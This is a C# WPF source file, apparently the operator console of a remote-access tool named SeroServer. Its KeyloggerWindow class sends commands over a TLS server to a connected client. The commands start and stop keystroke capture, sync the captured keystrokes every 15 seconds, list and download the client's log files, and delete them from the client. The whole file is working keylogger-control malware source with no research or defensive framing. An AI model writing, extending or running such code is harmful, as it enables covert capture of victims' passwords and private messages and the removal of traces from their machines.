using System.IO;
using System.Windows;
using System.Windows.Input;
using System.Windows.Threading;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class KeyloggerWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private bool               _capturing;
    private string             _currentFilename = "";
    private readonly DispatcherTimer _autoRefresh = new() { Interval = TimeSpan.FromSeconds(15) };

    public KeyloggerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = $"  —  {clientLabel}";

        _server.RegisterHandler(clientId, PacketType.KeyloggerLogsResult,  OnLogsResult);
        _server.RegisterHandler(clientId, PacketType.KeyloggerFilesResult, OnFilesResult);
        _server.RegisterHandler(clientId, PacketType.KeyloggerFileContent, OnFileContent);

        _autoRefresh.Tick += (_, _) => { if (_capturing) RequestLogs(); };

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.KeyloggerLogsResult);
            _server.UnregisterHandler(clientId, PacketType.KeyloggerFilesResult);
            _server.UnregisterHandler(clientId, PacketType.KeyloggerFileContent);
            _autoRefresh.Stop();
        };

        // Load file list on open
        Loaded += async (_, _) =>
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
    }

    // ── Outgoing ────────────────────────────────────────────────────────────

    private async void RequestLogs()
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs });
    }

    private async void RequestFileList()
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
        TxtStatus.Text = "Refreshing file list…";
    }

    // ── Incoming ────────────────────────────────────────────────────────────

    private void OnLogsResult(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<KeyloggerLogsResultData>(pkt.Data);
        if (data == null) return;
        Dispatcher.Invoke(() =>
        {
            _capturing = data.IsRunning;
            UpdateBadge();
            if (!string.IsNullOrEmpty(data.Logs))
            {
                TxtLog.AppendText(data.Logs);
                TxtLog.ScrollToEnd();
                TxtViewerTitle.Text = $"Live buffer — {_capturing}";
            }
            TxtStatus.Text = _capturing ? "Capturing — auto-sync every 15 s" : "Stopped";
        });
    }

    private void OnFilesResult(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<KeyloggerFilesResultData>(pkt.Data);
        if (data == null) return;
        Dispatcher.Invoke(() =>
        {
            _capturing = data.IsRunning;
            UpdateBadge();

            ListFiles.Items.Clear();
            foreach (var f in data.Files)
                ListFiles.Items.Add(new LogFileVM(f.Filename, f.Size));

            TxtStatus.Text = $"{data.Files.Count} log file(s) on client  —  capturing: {(_capturing ? "yes" : "no")}";
        });
    }

    private void OnFileContent(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<KeyloggerFileContentData>(pkt.Data);
        if (data == null) return;
        Dispatcher.Invoke(() =>
        {
            TxtLog.Text = data.Content;
            TxtViewerTitle.Text = data.Filename;
            TxtLog.ScrollToEnd();
            TxtStatus.Text = $"Loaded {data.Filename}  ({data.Content.Length:N0} chars)";
        });
    }

    // ── Button handlers ──────────────────────────────────────────────────────

    private async void BtnStart_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
        _capturing = true; UpdateBadge();
        BtnStart.IsEnabled = false; BtnStop.IsEnabled = true;
        _autoRefresh.Start();
        TxtStatus.Text = "Capturing — auto-sync every 15 s";
    }

    private async void BtnStop_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStop });
        _capturing = false; UpdateBadge();
        BtnStart.IsEnabled = true; BtnStop.IsEnabled = false;
        _autoRefresh.Stop();
        RequestLogs();
        // Refresh file list after stop so new file appears
        await Task.Delay(600);
        RequestFileList();
    }

    private void BtnRefresh_Click(object s, RoutedEventArgs e) => RequestFileList();

    private async void ListFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
    {
        if (ListFiles.SelectedItem is not LogFileVM vm) return;
        _currentFilename = vm.Filename;
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.KeyloggerGetFile,
            Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
        });
        TxtStatus.Text = $"Loading {vm.Filename}…";
    }

    private async void BtnDelete_Click(object s, RoutedEventArgs e)
    {
        if (ListFiles.SelectedItem is not LogFileVM vm) return;
        if (MessageBox.Show($"Delete '{vm.Filename}' from client?", "Confirm",
            MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;

        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.KeyloggerDeleteFile,
            Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
        });
        await Task.Delay(400);
        RequestFileList();
        TxtLog.Clear();
        TxtViewerTitle.Text = "Select a log file to view";
    }

    private void BtnDownload_Click(object s, RoutedEventArgs e)
    {
        if (string.IsNullOrEmpty(TxtLog.Text) || string.IsNullOrEmpty(_currentFilename))
        { TxtStatus.Text = "Nothing to download — select a file first."; return; }

        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter   = "Text Files (*.txt)|*.txt",
            FileName = _currentFilename
        };
        if (dlg.ShowDialog() != true) return;
        File.WriteAllText(dlg.FileName, TxtLog.Text, System.Text.Encoding.UTF8);
        TxtStatus.Text = $"Saved: {dlg.FileName}";
    }

    private void BtnSave_Click(object s, RoutedEventArgs e) => BtnDownload_Click(s, e);

    private void UpdateBadge()
    {
        BadgeRunning.Visibility = _capturing ? Visibility.Visible : Visibility.Collapsed;
        if (_capturing) { BtnStart.IsEnabled = false; BtnStop.IsEnabled = true; }
        else            { BtnStart.IsEnabled = true;  BtnStop.IsEnabled = false; }
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed) DragMove();
    }
    private void Close_Click(object s, RoutedEventArgs e) => Close();
}

public class LogFileVM
{
    public string Filename    { get; }
    public string DateDisplay { get; }
    public string SizeDisplay { get; }

    public LogFileVM(string filename, long size)
    {
        Filename    = filename;
        DateDisplay = System.IO.Path.GetFileNameWithoutExtension(filename);
        SizeDisplay = size < 1024 ? $"{size} B" : $"{size / 1024.0:F1} KB";
    }
}
